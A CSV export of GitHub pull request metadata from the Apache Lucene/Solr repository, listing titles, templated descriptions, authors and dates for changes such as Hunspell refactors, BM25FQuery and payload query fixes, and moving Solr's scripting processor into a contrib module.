"","2223","LUCENE-9681: deduplicate decodeFlags+hasFlag checks","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Too much repetitive code.  # Solution  Introduce methods more suited for the frequent usage patterns  # Tests  no new functionality, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-20T12:45:53Z","2021-01-20T17:23:42Z"
"","2397","LUCENE-9776: Hunspell: allow to inflect the last part of COMPOUNDRULE compounds","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  To support Dutch ""15-urige"" (inflected ""15-urig"")  # Solution  To allow affixes and honor ONLYINCOMPOUND there but not COMPOUNDFLAG/COMPOUNDEND, introduce yet another compound word context  COMPOUND_RULE_END, use it in the last part of a compound rule.  # Tests  `compoundrule4` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-18T09:26:09Z","2021-02-19T20:08:45Z"
"","2434","LUCENE-9813: Add a convenience constructor IntsRef(int[])","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  to avoid repetitive passing of 0 and array.length everywhere  # Solution  Add the constructor, call it where applicable  # Tests  Nothing dedicated, but some tests now use the new API and still pass :)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-26T09:27:35Z","2021-03-10T13:41:14Z"
"","2138","LUCENE-9635: BM25FQuery - Mask encoded norm long value in array lookup","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Through some experimentation with with the BM25FQuery on long documents, I've discovered that there is a bug that doesn't mask the encoded norm's long value during scoring. For long documents (or long fields) this may cause ArrayIndexOutOfBoundsExceptions.  The line where I suspect the bug is being exposed is here https://github.com/apache/lucene-solr/blob/master/lucene/sandbox/src/java/org/apache/lucene/sandbox/search/MultiNormsLeafSimScorer.java#L131  Here is a similar use in BM25Similarity with the masking https://github.com/apache/lucene-solr/blob/c413656b627160d49eb9e9f1f84ec4945db80f0e/lucene/core/src/java/org/apache/lucene/search/similarities/BM25Similarity.java#L233  My experimentation shows that to expose this bug, there must be a match for a token in more than one field (which is what BM25FQuery is for). In addition one of the fields must be >= 32792 tokens long.  I've provided tests in the pull request to demonstrate this.  # Solution  Change the array lookup to norm & 0xff  # Tests  Added tests for single and multiple long documents that exposes this problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","yiluncui","2020-12-09T21:43:26Z","2020-12-18T15:15:38Z"
"","2076","LUCENE-9603: Remove redundant fieldType.stored() check","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This removes just a redundant check.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","mrkm4ntr","2020-11-11T07:55:35Z","2021-03-02T01:18:44Z"
"","2097","LUCENE-9537","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This pull request implements logic from our academic search engine Indri: http://www.lemurproject.org/indri.php.  The functionality that is implemented is a smoothing score for search terms or subqueries that are not present in the document being scored.  The smoothing score acts like an idf so that documents that do not have terms or subqueries that are more frequent in the index are not penalized as much as documents that do not have less frequent terms or subqueries.  Additionally, Indri's dirichelet smoothing similarity has been added.  # Solution  The smoothingScore method has been added to the Scorable interface and implemented in the abstract class Scorer.  The classes IndriAndQuery, IndriAndWeight, and IndriAndScorer have been added to call the smoothingScore method on documents where the search term or subquery are not present.  The class IndriDirichletSimilarity has been added for implementing Indri's equation for the Language Model with Dirichlet smoothing.  # Tests  TestIndriAndQuery and TestIndriDirichletSmoothing have been added.  I am happy to expand upon these tests and implement more tests.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","cammiemw","2020-11-25T15:03:18Z","2022-01-26T18:15:13Z"
"","2215","SOLR-14067: v3 Create /contrib/scripting module with ScriptingUpdateProcessor","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR supersecedes the work done in #2016, as it doesn't drag all the commits made to master.   I followed the steps recommend by Joel Bernstein in another PR to clean up the commit history in creating this PR.  To improve our security posture, this moves the ScriptingUpdateProcessor to a new contrib module that isn't installed in Solr by default.   This is also a chance to clean up the name of the processor from the old slightly awkward name ""StatelessScriptingUpdateProcessor"" to a simpler name.  # Solution  * Created a new `/contrib/scripting` module, and move the code and tests related to scripting under it.    * Relocating the code under `org.apache.solr.scripting` avoids a ""split package"" issue. * Updated all the references to `StatelessScriptingUpdateProcessor` to `ScriptingUpdateProcessor` in code and ref guide.    # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-01-18T12:27:34Z","2021-01-25T15:14:16Z"
"","2257","SOLR-14067: v4 Create /contrib/scripting module with ScriptingUpdateProcessor","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR supersecedes the work done in #2016, as it doesn't drag all the commits made to master.   I followed the steps recommend by Joel Bernstein in another PR to clean up the commit history in creating this PR.  The prevous version of this PR had unit test failures, and this one attempts to fix it up.  To improve our security posture, this moves the ScriptingUpdateProcessor to a new contrib module that isn't installed in Solr by default.   This is also a chance to clean up the name of the processor from the old slightly awkward name ""StatelessScriptingUpdateProcessor"" to a simpler name.  # Solution  * Created a new `/contrib/scripting` module, and move the code and tests related to scripting under it.    * Relocating the code under `org.apache.solr.scripting` avoids a ""split package"" issue. * Updated all the references to `StatelessScriptingUpdateProcessor` to `ScriptingUpdateProcessor` in code and ref guide. * Introduce a mock `ScriptingUpdateProcessor` for the `TestConfigSetsAPI` test on untrusted and trusted configsets.    # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-01-27T21:52:28Z","2021-01-29T21:47:54Z"
"","1711","SOLR-14702: Remove oppressive language (part1)","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR removes all references of ""master slave"" from the Solr code base. this should've happened years ago as it can result in alienating many people working with the project.  # Solution  Replaces master with leader and slave with follower.  # Tests  Run standard tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-02T10:01:39Z","2020-08-05T22:51:51Z"
"","1733","LUCENE-9450 Use BinaryDocValues in the taxonomy writer","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR modifies the taxonomy writer and reader implementation to use BinaryDocValues instead of StoredValues.  The taxonomy index uses stored fields today and must do a number of stored field lookups for each query to resolve taxonomy ordinals back to human presentable facet labels.  # Solution  Change the storage format to use DocValues  # Tests  ant test fails because `.binaryValue()` returns a `NullPointerException`  To reproduce the error: `ant test  -Dtestcase=TestExpressionAggregationFacetsExample -Dtests.method=testSimple -Dtests.seed=4544BD51622879A4 -Dtests.slow=true -Dtests.badapples=true -Dtests.locale=si -Dtests.timezone=Antarctica/DumontDUrville -Dtests.asserts=true -Dtests.file.encoding=US-ASCII`  gives  ```nit4:pickseed] Seed property 'tests.seed' already defined: 4544BD51622879A4     [mkdir] Created dir: /Users/gauworah/opensource/mystuff/lucene-solr/lucene/build/demo/test/temp    [junit4]  says Привет! Master seed: 4544BD51622879A4    [junit4] Executing 1 suite with 1 JVM.    [junit4]     [junit4] Started J0 PID(76859@localhost).    [junit4] Suite: org.apache.lucene.demo.facet.TestExpressionAggregationFacetsExample    [junit4]   2> NOTE: reproduce with: ant test  -Dtestcase=TestExpressionAggregationFacetsExample -Dtests.method=testSimple -Dtests.seed=4544BD51622879A4 -Dtests.slow=true -Dtests.badapples=true -Dtests.locale=si -Dtests.timezone=Antarctica/DumontDUrville -Dtests.asserts=true -Dtests.file.encoding=US-ASCII    [junit4] ERROR   0.61s | TestExpressionAggregationFacetsExample.testSimple <<<    [junit4]    > Throwable #1: java.lang.NullPointerException    [junit4]    >        at __randomizedtesting.SeedInfo.seed([4544BD51622879A4:7DF799AF45DBAD75]:0)    [junit4]    >        at org.apache.lucene.index.MultiDocValues$3.binaryValue(MultiDocValues.java:403)    [junit4]    >        at org.apache.lucene.facet.taxonomy.directory.DirectoryTaxonomyReader.getPath(DirectoryTaxonomyReader.java:328)    [junit4]    >        at org.apache.lucene.facet.taxonomy.FloatTaxonomyFacets.getTopChildren(FloatTaxonomyFacets.java:151)    [junit4]    >        at org.apache.lucene.demo.facet.ExpressionAggregationFacetsExample.search(ExpressionAggregationFacetsExample.java:107)    [junit4]    >        at org.apache.lucene.demo.facet.ExpressionAggregationFacetsExample.runSearch(ExpressionAggregationFacetsExample.java:118)    [junit4]    >        at org.apache.lucene.demo.facet.TestExpressionAggregationFacetsExample.testSimple(TestExpressionAggregationFacetsExample.java:28)    [junit4]    >        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    [junit4]    >        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)    [junit4]    >        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    [junit4]    >        at java.base/java.lang.reflect.Method.invoke(Method.java:567)    [junit4]    >        at java.base/java.lang.Thread.run(Thread.java:830) ```  3 other tests also fail at the function call # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).  **This is a draft PR**","closed","","gautamworah96","2020-08-10T21:40:13Z","2020-11-12T22:13:32Z"
"","2090","LUCENE-9618: demo unit test","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR is not intended to be merged. It's just for demonstration of issues mentioned in [LUCENE-9618](https://issues.apache.org/jira/browse/LUCENE-9618)","closed","","zhaih","2020-11-19T18:37:32Z","2020-11-22T06:41:49Z"
"","2185","LUCENE-9659 inequality support in payload check query","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR is in support for LUCENE-9659 it updates the SpanPayloadCheckQuery to support inequality operations on string/integer/floating point encoded payload values.    # Solution  This creates a factory that implements the operation logic for decoding the payload and applying the inequality test to a reference payload. Existing behavior is preserved if the operation is null or ""eq"".  # Tests  A unit test was added for this new functionality to test string payloads greater than / less than / greater than or equal / less than or equal.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","kwatters","2021-01-07T20:36:28Z","2021-02-17T18:30:15Z"
"","1928","LUCENE-9444: Improve test coverage for TaxonomyFacetLabels","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR improves test coverage for `TaxonomyFacetLabels` ( added in [PR 1893](https://github.com/apache/lucene-solr/pull/1893/files) ) by exercising the API - `TaxonomyFacetLabels.nextFacetLabel(docId, facetDimension)` to fetch facet labels for a specific dimension.  # Solution  The solution enhances the test method - `TestTaxonomyFacetCounts.testRandom()` and does the following   - Pick a dimension at random   - Filter expected facet labels to retain entries for chosen dimension only.   - Invoke the API - `TaxonomyFacetLabels.nextFacetLabel(docId, facetDimension)` to get facet labels for specific dimension.   - Ensures that `expected` and `actual` facet labels match.  # Tests    - `TestTaxonomyFacetCounts.testRandom()` is enhanced to improve test coverage for `TaxonomyFacetLabels`.    - `FacetTestCase` is refactored to add a `dimension` parameter to utility method `getAllTaxonomyFacetLabels(...)`   # Checklist  Please review the following and check all that apply:  - [x ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ x] I have created a Jira issue and added the issue ID to my pull request title. - [ x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ x] I have developed this patch against the `master` branch. - [x ] I have run `./gradlew check`. - [x ] I have added tests for my changes. - [x ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","goankur","2020-09-28T23:45:01Z","2020-09-30T17:21:18Z"
"","2014","LUCENE-8183: Added the abbility to get noSubMatches and noOverlapping Matches","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This is the solution for LUCENE-8183. The change is taken form the patch in the workitem.  # Solution  ## New Parameters: noSubMatches: true/false noOverlappingMatches: true/false together with the existing onlyLongestMatch those can be used to define what subwords should be added as tokens. Functionality is as described above.  Typically users will only want to include one of the three attributes as enabling noOverlappingMatches is the most restrictive and noSubMatches is more restrictive as onlyLongestMatch. When enabling a more restrictive option the state of the less restrictive does not have any effect.  Because of that it would be an option to refactor this to an single attribute with different setting, but this would require to think about backward compatibility for configurations that do use onlyLongestMatch=true at the moment.  ## Algorithm If processing of subWords is deactivated (any of onlyLongestMatch, noSubMatches, noOverlappingMatches is active) the algorithm first checks if the token is part of the dictionary. If so it returns immediately. This is to avoid adding tokens for subwords if the token itself is in the dictionary (see #testNoSubAndTokenInDictionary for more info).  I changed the iteration direction of the inner for loop to start with the longest possible subword as this simplified the code.  NOTE: that this also changes the order of the Tokens in the token stream but as all tokens are at the same position that should not make any difference. I had however to modify some existing tests as those where sensitive to the ordering  # Tests  I added two test methods in TestCompoundWordTokenFilter  1. #testNoSubAndNoOverlap() tests the expected behaviour of the noSubMatches and noOverlappingMatches options 2. #testNoSubAndTokenInDictionary() tests that no tokens for subwords are added in the case that the token in part of the dictionary  In addition TestHyphenationCompoundWordTokenFilterFactory#testLucene8183() asserts that the new configuration options are parsed.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","MartinDemberger","2020-10-21T12:40:44Z","2021-01-13T20:40:15Z"
"","2270","LUCENE-9708: Hunspell: support FLAG UTF-8 in absence of SET UTF-8","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This is a valid situation to be supported :(  # Solution  Explititly encode/decode UTF-8 from default charset bytes  # Tests  Extended `TestDictionary`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-29T10:45:14Z","2021-02-01T09:37:21Z"
"","1810","SOLR-14787 - supporting an operator for the payload check query parser to support greater than / less than payload check queries.","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This is a change to the payload check query parser.  It allows users to pass an ""op"" and a ""threshold"" value as a local param.  Those are wired through to the SpanPayloadCheck lucene query.  For delimited payload fields with a float, this threshold will be compared against the payload of the matching term using the appropriate inequality operation of gt, gte, lt, lte  (for > < >= <= )    # Solution  This makes the span payload check query a bit more flexible in that you can swap in a different compare method for the payloads.  This should be reasonably extensible.  # Tests  This works on and adds a test case to the TestPayloadCheckQParser.  One item of note, one of the existing text cases in this unit test appears to have started failing between 8.2.0 and 8.3.0   (for some reason the payloads are coming back lower cased instead of the original byte value of upper cased.  I have not tracked down what changes might be responsible for that change.)  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","kwatters","2020-08-31T21:21:08Z","2020-10-06T20:49:04Z"
"","1770","SOLR-14763 SolrJ HTTP/2 Async API using CompletableFuture","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This change adds a standard `CompletableFuture> requestAsync(SolrRequest request)` API to SolrClient, implemented for Http2SolrClient and CloudHttp2SolrClient (Http2SolrClient already had an async method implemented recently, but this was not standard/not extended to the cloud client). Additionally, this change removes custom AsyncListener/Cancellable interfaces, instead using CompletableFuture as a standard for async request methods.  # Solution  * An async method was already added to Http2SolrClient in [SOLR-14354](https://github.com/apache/lucene-solr/pull/1470/files). This change refactors the already existing method to fit the new method signature * The LBHttp2SolrClient has a separate async method using its internal Req/Rsp classes, also added in SOLR-14354. This change also refactors this method to use CompletableFuture (although this doesn't override the SolrClient API, as it still uses Req/Rsp). * Http2SolrCloudClient uses an LBHttp2SolrClient internally, so it can utilize LBHttp2SolrClient's async request method to make async calls as well. This refactors BaseCloudSolrClient to add CompletableFuture support so that Http2SolrClient can make async requests. * For now, SolrClient will throw an UnsupportedOperationException if requestAsync method is called on a client besides Http2SolrClient or CloudHttp2SolrClient.  # Tests  Added test cases to Http2SolrClient to test async requests in the same way synchronous requests are tested. Also added a test case to test that async requests and normal requests made by CloudHttp2SolrClient index/query in the same way.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","rishisankar","2020-08-20T23:00:19Z","2020-09-28T12:10:33Z"
"","2333","LUCENE-9752: Hunspell Stemmer: reduce parameter count","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  There's too many parameters, some of them avoidable  # Solution  `doSuffix` is always true, `circumfix` can be calculated at the usage site (and once, not for every homonym).  # Tests  Unaffected  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T10:35:29Z","2021-02-10T08:51:58Z"
"","2243","LUCENE-9698: Hunspell: reuse char[] when possible when stripping affix","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  There's no need to allocate another char[] if we can analyze a sub-array of what we already have  # Solution  In addition to `char[]` and `int length`, pass `int offset` everywhere, and adjust offset/length instead of allocating a new array, when an affix is removed and nothing is added in its place.  # Tests  No behavior change, no new tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-25T12:41:02Z","2021-01-26T12:06:29Z"
"","2242","LUCENE-9697: Hunspell Stemmer: use the same FST.BytesReader on all recursion levels","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  There's no need to allocate 3 `BytesReader`s when just one would be enough, as it's used as a scratch, without a need to preserve any state between uses.  # Solution  Allocate just one `BytesReader` per affix type  # Tests  No behavior change, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-25T12:29:35Z","2021-01-26T11:19:19Z"
